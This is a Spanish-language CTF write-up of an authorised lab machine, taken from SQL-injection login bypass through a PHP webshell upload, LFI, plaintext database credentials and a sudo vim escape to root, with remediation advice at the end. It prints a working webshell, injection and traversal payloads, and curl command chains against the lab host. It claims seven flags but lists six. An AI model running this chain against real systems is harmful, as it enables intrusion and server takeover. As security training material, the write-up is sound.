---
layout: writeup
title: "Laboratorio EHCA — Vuln-Academia"
date: 2026-09-16
permalink: /maquinas/ehca-vuln-academia/
categories: [Maquinas, EHCA, Pentesting]
tags: [EHCA, Linux, SQLi, File-Upload, RCE, LFI, MariaDB, Credential-Reuse, Sudo, Vim, PrivEsc]
platform: "EHCA / Vuln-Academia"
os: "Linux"
difficulty: "Intermedia"
initial_access: "SQL Injection / File Upload → RCE"
privilege_escalation: "Reutilización de credenciales / sudo Vim"
status: "Completado"
techniques:
  - Linux
  - SQLi
  - File Upload
  - RCE
  - LFI
  - MariaDB
  - PrivEsc
excerpt: "Cadena de explotación documentada en un laboratorio EHCA autorizado: SQLi, carga de archivos, RCE, LFI, reutilización de credenciales y escalada mediante sudo Vim."
---

> **Entorno autorizado:** laboratorio CTF de EHCA. Este writeup documenta la resolución del entorno de práctica descrito en el material original.

## Resumen del laboratorio

Writeup completo de la auditoria de seguridad realizada contra el laboratorio CTF "Laboratorio EHCA · Vuln-Academia".

Objetivo: http://157.245.220.50:8080/

Resultado: compromiso total del servidor, desde acceso anonimo no autenticado hasta shell como root, encadenando 6 vulnerabilidades.

Flags obtenidas (7):
  CTF{web_sqli_flag}       -- SQL Injection en login.php
  CTF{file_upload_flag}    -- Subida de archivos sin restriccion
  CTF{lfi_flag}            -- LFI en download.php
  CTF{ssh_flag}            -- Reutilizacion de credenciales (su carlos)
  CTF{root_pwned_flag}     -- Escalada a root (vim GTFOBins)
  CTF{vim_escape_flag}     -- Escalada a root (vim GTFOBins)

Este archivo recoge, paso a paso y con capturas reales, como reproducir manualmente toda la cadena de explotacion.

## 1. Reconocimiento inicial

Se accede a la pagina principal del laboratorio:

```text
http://157.245.220.50:8080/index.php
```

La pagina expone tres rutas con pistas (en espanol, a modo de acertijo) sobre el tipo de vulnerabilidad que oculta cada una:

```text
login.php     -> "La llave que no distingue cerraduras"   (sugiere SQL Injection / bypass de autenticacion)
upload.php    -> "El regalo que trae sorpresas dentro"    (sugiere subida de archivos maliciosos)
download.php  -> "El sendero que conduce a los secretos"  (sugiere LFI / path traversal)
```

Tambien indica el formato de las banderas: CTF{...}

![Evidencia — 1. Reconocimiento inicial](/assets/images/writeups/ehca/ehca-01.png)

## 2. SQL Injection en login.php (flag 1)

Al leer el codigo fuente de login.php (mas adelante, via LFI en download.php) se confirma la vulnerabilidad:

```text
$sql = "SELECT id,username FROM users WHERE username='$u' AND password='$p' LIMIT 1";
$res = $pdo->query($sql);
```

Las variables $u y $p (los campos "user" y "pass" del formulario) se concatenan directamente en la consulta SQL, sin sentencias preparadas. Esto permite alterar la logica del WHERE.

Pasos para reproducirlo manualmente:

  1) Navegar a http://157.245.220.50:8080/login.php
  2) En el campo "Nombre" escribir el payload de bypass:

```text
' OR '1'='1' -- -
```

  3) En el campo "Secreto" escribir cualquier texto (por ejemplo: x)
  4) Pulsar "Abrir"

La consulta que se ejecuta en el servidor queda asi:

```text
SELECT id,username FROM users WHERE username='' OR '1'='1' -- -' AND password='x' LIMIT 1
```

El "-- -" comenta el resto de la consulta (incluida la comprobacion de password), y "'1'='1'" es siempre verdadero, por lo que el WHERE devuelve la primera fila de la tabla "users" (el usuario "admin") sin necesidad de conocer ninguna contrasena real.

Resultado: mensaje "Bienvenido admin" -- bypass de autenticacion confirmado.

La flag de esta etapa se obtiene mas adelante consultando directamente la base de datos (ver nodo 5), en la tabla "vuln.flags":

```text
CTF{web_sqli_flag}
```

![Evidencia — 2. SQL Injection en login.php (flag 1)](/assets/images/writeups/ehca/ehca-02.png)

![Evidencia — 2. SQL Injection en login.php (flag 1)](/assets/images/writeups/ehca/ehca-03.png)

![Evidencia — 2. SQL Injection en login.php (flag 1)](/assets/images/writeups/ehca/ehca-04.png)

## 3. Subida de archivos sin restriccion -> RCE (flag 2)

El codigo fuente de upload.php (obtenido despues via LFI) revela la vulnerabilidad:

```text
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['f'])) {
move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']);
file_put_contents('uploads/flag2.txt', 'CTF{file_upload_flag}');
...
}
```

No hay ninguna validacion de extension, tipo MIME ni contenido: cualquier archivo subido se guarda tal cual en "uploads/", una carpeta accesible publicamente y con permiso de ejecucion PHP. Ademas, cada subida exitosa escribe automaticamente la flag de esta etapa en "uploads/flag2.txt".

Pasos para reproducirlo manualmente:

  1) Crear un archivo "shell.php" con una webshell minima:

```text
<?php
if(isset($_GET['cmd'])){
echo "<pre>";
system($_GET['cmd'] . " 2>&1");
echo "</pre>";
}
?>
```

  2) En el navegador, ir a http://157.245.220.50:8080/upload.php y subir "shell.php" con el boton de examinar archivos, o por linea de comandos:

```text
curl -s -F "f=@shell.php" "http://157.245.220.50:8080/upload.php"
```

  3) La respuesta confirma la ruta final del archivo subido: /uploads/shell.php

  4) Verificar la ejecucion remota de comandos (RCE) visitando:

```text
http://157.245.220.50:8080/uploads/shell.php?cmd=id
```

```text
La salida confirma que el codigo se ejecuta con el usuario del servidor web:
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A partir de aqui, toda la post-explotacion (enumeracion, escalada de privilegios) se realiza reutilizando esta webshell con distintos comandos en el parametro "cmd".

Flag de esta etapa (se genera automaticamente en cada subida exitosa):

```text
CTF{file_upload_flag}
```

![Evidencia — 3. Subida de archivos sin restriccion -> RCE (flag 2)](/assets/images/writeups/ehca/ehca-05.png)

![Evidencia — 3. Subida de archivos sin restriccion -> RCE (flag 2)](/assets/images/writeups/ehca/ehca-06.png)

![Evidencia — 3. Subida de archivos sin restriccion -> RCE (flag 2)](/assets/images/writeups/ehca/ehca-07.png)

![Evidencia — 3. Subida de archivos sin restriccion -> RCE (flag 2)](/assets/images/writeups/ehca/ehca-08.png)

## 4. LFI / Path Traversal en download.php (flag 3)

El codigo fuente de download.php confirma la vulnerabilidad de inclusion local de archivos:

```text
$file    = isset($_GET['file']) ? $_GET['file'] : '';
$content = '';
if($file !== '') {
$content = htmlspecialchars(@file_get_contents($file));
}
```

El parametro "file" se pasa sin ninguna sanitizacion a file_get_contents(), permitiendo leer cualquier archivo al que tenga acceso el usuario www-data: codigo fuente PHP de la propia aplicacion, archivos de configuracion, o archivos del sistema operativo mediante path traversal ("../").

Pasos para reproducirlo manualmente:

  1) Leer un archivo del sistema (path traversal):

```text
http://157.245.220.50:8080/download.php?file=../../../../etc/passwd
```

  2) Leer el codigo fuente de cualquier pagina de la propia aplicacion (sin necesidad de traversal, ya que el working directory es el webroot):

```text
http://157.245.220.50:8080/download.php?file=login.php
http://157.245.220.50:8080/download.php?file=upload.php
http://157.245.220.50:8080/download.php?file=download.php
```

  3) Leer la flag de esta etapa, ya presente en el webroot:

```text
http://157.245.220.50:8080/download.php?file=flag3.txt
```

Gracias a este LFI se obtuvo el codigo fuente exacto de login.php y upload.php usado en los nodos anteriores de este writeup.

Flag de esta etapa:

```text
CTF{lfi_flag}
```

![Evidencia — 4. LFI / Path Traversal en download.php (flag 3)](/assets/images/writeups/ehca/ehca-09.png)

## 5. Enumeracion post-explotacion (MySQL root sin contrasena)

Con RCE como www-data (nodo 3), se enumera el sistema en busca de vias de escalada. Todos los comandos se ejecutan a traves de la webshell:

```text
http://157.245.220.50:8080/uploads/shell.php?cmd=<COMANDO>
```

Hallazgo clave: el usuario "root" de MariaDB no tiene contrasena configurada y tiene privilegios totales:

```text
mysql -u root -e "show grants for root@localhost;"
-> GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` WITH GRANT OPTION
```

Se enumera la base de datos de la aplicacion ("vuln"):

```text
mysql -u root -e "use vuln; show tables; select * from users; select * from flags;"
```

Resultado -- tabla "users" (contrasenas en texto plano):

```text
id  username  password
1   admin     admin123
2   carlos    password123
```

Resultado -- tabla "flags":

```text
id  flagtext
1   CTF{web_sqli_flag}
```

El hallazgo mas importante es la contrasena del usuario "carlos" (password123), ya que ese mismo nombre de usuario existe como cuenta del sistema operativo (visible en /etc/passwd via el LFI del nodo 4). Se prueba reutilizar la contrasena para acceder a esa cuenta (ver nodo 6).

Flag adicional obtenida en este paso (duplicada, ya vista en el nodo 2):

```text
CTF{web_sqli_flag}
```

![Evidencia — 5. Enumeracion post-explotacion (MySQL root sin contrasena)](/assets/images/writeups/ehca/ehca-10.png)

## 6. Escalada a carlos por reutilizacion de credenciales (flag 4)

Se comprueba si la contrasena de "carlos" en la base de datos (password123, nodo 5) es la misma que su contrasena de sistema operativo. El servicio SSH del host solo acepta autenticacion por clave publica (no por contrasena), asi que la prueba se hace localmente con "su", desde la propia webshell:

```text
echo password123 | su carlos -c 'id; sudo -l'
```

Resultado:

```text
Password: uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)
```

```text
Matching Defaults entries for carlos on ...:
env_reset, mail_badpass, secure_path=..., use_pty
```

```text
User carlos may run the following commands on ...:
(ALL) NOPASSWD: /usr/bin/vim
```

Dos hallazgos en un solo paso:

  1) La contrasena se reutiliza -- confirmado el pivote de www-data a la cuenta real "carlos" del sistema.
  2) "carlos" puede ejecutar /usr/bin/vim como root sin contrasena (entrada NOPASSWD en sudoers). Esto es un vector de escalada de privilegios inmediato (ver GTFOBins para vim), explotado en el nodo 7.

En el home de carlos aparece tambien la flag de esta etapa:

```text
CTF{ssh_flag}
```

![Evidencia — 6. Escalada a carlos por reutilizacion de credenciales (flag 4)](/assets/images/writeups/ehca/ehca-11.png)

## 7. Escalada a root via sudo + vim (GTFOBins) (flags 5 y 6)

El nodo anterior revelo que "carlos" puede ejecutar vim como root sin contrasena:

```text
(ALL) NOPASSWD: /usr/bin/vim
```

vim permite lanzar comandos de shell arbitrarios desde su modo comando con ":!comando", heredando los privilegios con los que se ejecuto vim (root, en este caso via sudo). Esta tecnica esta documentada en GTFOBins (https://gtfobins.github.io/gtfobins/vim/).

Pasos para reproducirlo manualmente (una vez autenticado como carlos, por ejemplo dentro de "su carlos -c '...'"):

  1) Comprobar la escalada ejecutando "id" como root, en modo no interactivo (-es = Ex silent mode, util cuando no hay una terminal real como en nuestra webshell):

```text
sudo vim -es -c ':!id' -c ':qa!'
```

```text
Resultado: uid=0(root) gid=0(root) groups=0(root)
```

  2) Con una shell interactiva real (por ejemplo por SSH con clave, o en una terminal local), el equivalente clasico de GTFOBins es simplemente:

```text
sudo vim
:!/bin/sh
```

```text
lo que deja una shell interactiva como root.
```

  3) Leer la flag final del sistema:

```text
sudo vim -es -c ':!cat /root/flag_root.txt' -c ':qa!'
```

```text
Resultado:
```

```text
CTF{root_pwned_flag}
CTF{vim_escape_flag}
```

Comando completo tal como se ejecuto desde la webshell (encadenando su + sudo + vim en una sola linea, por eso las comillas anidadas):

```text
curl -s -G "http://157.245.220.50:8080/uploads/shell.php" \
--data-urlencode "cmd=echo password123 | su carlos -c \"sudo vim -es -c ':!cat /root/flag_root.txt' -c ':qa!'\""
```

Con esto se completa la cadena de explotacion: de visitante anonimo a root del servidor.

![Evidencia — 7. Escalada a root via sudo + vim (GTFOBins) (flags 5 y 6)](/assets/images/writeups/ehca/ehca-12.png)

![Evidencia — 7. Escalada a root via sudo + vim (GTFOBins) (flags 5 y 6)](/assets/images/writeups/ehca/ehca-13.png)

## 8. Resumen de flags y remediacion

Cadena de explotacion completa:

  1. Reconocimiento de index.php -> se descubren login.php, upload.php, download.php
  2. SQL Injection en login.php -> bypass de autenticacion
  3. Subida de archivos sin restriccion en upload.php -> webshell -> RCE como www-data
  4. LFI en download.php -> codigo fuente + /etc/passwd
  5. MySQL root sin contrasena -> credenciales de "carlos" en texto plano
  6. Reutilizacion de credenciales -> su carlos
  7. sudoers NOPASSWD en /usr/bin/vim -> escalada a root (GTFOBins)

Flags obtenidas (7):

```text
CTF{web_sqli_flag}       -- SQL Injection (login.php)
CTF{file_upload_flag}    -- Unrestricted File Upload
CTF{lfi_flag}            -- LFI / Path Traversal (download.php)
CTF{ssh_flag}            -- Reutilizacion de credenciales (su carlos)
CTF{root_pwned_flag}     -- Escalada a root (vim GTFOBins)
CTF{vim_escape_flag}     -- Escalada a root (vim GTFOBins)
```

Recomendaciones de remediacion:

  - login.php: usar sentencias preparadas (PDO bindParam) en vez de concatenar variables en el SQL.
  - upload.php: validar extension y tipo MIME real, renombrar archivos subidos, servir "uploads/" sin permiso de ejecucion PHP.
  - download.php: usar una lista blanca de archivos permitidos o normalizar la ruta con basename()/realpath() dentro de un directorio base fijo.
  - MySQL: establecer contrasena robusta para root@localhost, revisar privilegios GRANT, no reutilizar contrasenas entre la app y el sistema operativo.
  - sudoers: nunca otorgar NOPASSWD sobre binarios con capacidad de escape a shell (vim, less, find, awk, python, etc. -- ver catalogo GTFOBins).

El informe profesional completo, con hallazgos detallados, severidad, CWE/OWASP y evidencias, esta disponible en el documento Word adjunto: "Informe_Pentest_Laboratorio_EHCA.docx".

## 9. Reinicio del contenedor: como se pierden y se recuperan las flags

El laboratorio corre dentro de un contenedor Docker (el hostname de la maquina, algo como "e2c99c1c0377", lo delata). Estos contenedores de practica suelen reiniciarse periodicamente o bajo demanda de la plataforma, lo que borra cualquier cambio hecho en el sistema de archivos que no forme parte de la imagen base -- en concreto, todo lo que se haya subido a "uploads/" desaparece.

Sintoma tipico tras un reinicio: la webshell que subimos deja de responder y el navegador (o curl) devuelve 404:

```text
curl -s "http://157.245.220.50:8080/uploads/shell.php?cmd=id"
-> HTTP/1.1 404 Not Found
```

Esto NO significa que la vulnerabilidad se haya arreglado: solo se perdio el archivo subido. login.php, upload.php y download.php siguen siendo vulnerables exactamente igual que antes. La solucion es repetir el paso de subida (nodo 3) y, si hace falta, repetir la escalada (nodos 6 y 7) para volver a tener una shell como root -- el resto de la cadena de explotacion no cambia.

A continuacion, el proceso completo de recuperacion, con capturas reales de una sesion de terminal en vivo (no simuladas): re-subir la webshell y volver a extraer las 7 flags una por una.

Paso 1 -- volver a subir la webshell y confirmar RCE:

```text
curl -s -F "f=@shell.php" "http://157.245.220.50:8080/upload.php"
curl -s "http://157.245.220.50:8080/uploads/shell.php?cmd=id"
```

[Captura: h1_reupload.png -- terminal real mostrando la re-subida exitosa y "uid=33(www-data)" confirmando RCE de nuevo]

Paso 2 -- como se encontraron las credenciales debiles (tabla "users" completa, no solo la flag):

```text
curl -s -G "http://157.245.220.50:8080/uploads/shell.php" \
--data-urlencode "cmd=mysql -u root -e 'select * from vuln.users;'"
```

Esto es posible porque, como se explico en el nodo 5, el usuario "root" de MariaDB no tiene contrasena. El resultado expone las credenciales en texto plano de la aplicacion:

```text
id  username  password
1   admin     admin123
2   carlos    password123
```

Esta es la consulta exacta que revela de donde sale la contrasena "password123" usada mas adelante para "su carlos" -- no es un dato inventado, sale literalmente de esta tabla.

[Captura: h2_credenciales.png -- terminal real mostrando la consulta SQL y las credenciales admin123 / password123 en texto plano]

Paso 3 -- Flag 1 (SQL Injection):

```text
curl -s -G "http://157.245.220.50:8080/uploads/shell.php" \
--data-urlencode "cmd=mysql -u root -e 'select * from vuln.flags;'"
```

[Captura: h3_flag1.png -- CTF{web_sqli_flag}]

Paso 4 -- Flag 2 (Unrestricted File Upload; se regenera automaticamente en cada subida exitosa):

```text
curl -s -G "http://157.245.220.50:8080/uploads/shell.php" \
--data-urlencode "cmd=cat /var/www/html/uploads/flag2.txt"
```

[Captura: h4_flag2.png -- CTF{file_upload_flag}]

Paso 5 -- Flag 3 (LFI, directo por HTTP sin pasar por la webshell):

```text
curl -s "http://157.245.220.50:8080/download.php?file=flag3.txt"
```

[Captura: h5_flag3.png -- CTF{lfi_flag}]

Paso 6 -- Flag 4 (reutilizacion de credenciales, su -l para cargar el entorno de carlos y poder usar rutas relativas a su home):

```text
curl -s -G "http://157.245.220.50:8080/uploads/shell.php" \
--data-urlencode "cmd=echo password123 | su -l carlos -c 'cat flag_server.txt'"
```

[Captura: h6_flag4.png -- CTF{ssh_flag}]

Paso 7 -- Flags 5 y 6 (escalada a root vuelta a hacer desde cero, sudo + vim GTFOBins):

```text
curl -s -G "http://157.245.220.50:8080/uploads/shell.php" \
--data-urlencode "cmd=echo password123 | su carlos -c \"sudo vim -es -c ':!cat /root/flag_root.txt' -c ':qa!'\""
```

[Captura: h7_root.png -- CTF{root_pwned_flag} y CTF{vim_escape_flag}]

Nota practica: este ultimo comando (la cadena su + sudo + vim) resulto ser algo lento/inestable bajo carga -- en varias pruebas tardo mas de lo normal o incluso no respondio a la primera. Si no da resultado al momento, conviene reintentarlo (con un timeout generoso, 20-25s) antes de asumir que algo se rompio; en todas las repeticiones terminó funcionando.

![Evidencia — 9. Reinicio del contenedor: como se pierden y se recuperan las flags](/assets/images/writeups/ehca/ehca-14.png)

![Evidencia — 9. Reinicio del contenedor: como se pierden y se recuperan las flags](/assets/images/writeups/ehca/ehca-15.png)

![Evidencia — 9. Reinicio del contenedor: como se pierden y se recuperan las flags](/assets/images/writeups/ehca/ehca-16.png)

![Evidencia — 9. Reinicio del contenedor: como se pierden y se recuperan las flags](/assets/images/writeups/ehca/ehca-17.png)

![Evidencia — 9. Reinicio del contenedor: como se pierden y se recuperan las flags](/assets/images/writeups/ehca/ehca-18.png)

![Evidencia — 9. Reinicio del contenedor: como se pierden y se recuperan las flags](/assets/images/writeups/ehca/ehca-19.png)

![Evidencia — 9. Reinicio del contenedor: como se pierden y se recuperan las flags](/assets/images/writeups/ehca/ehca-20.png)
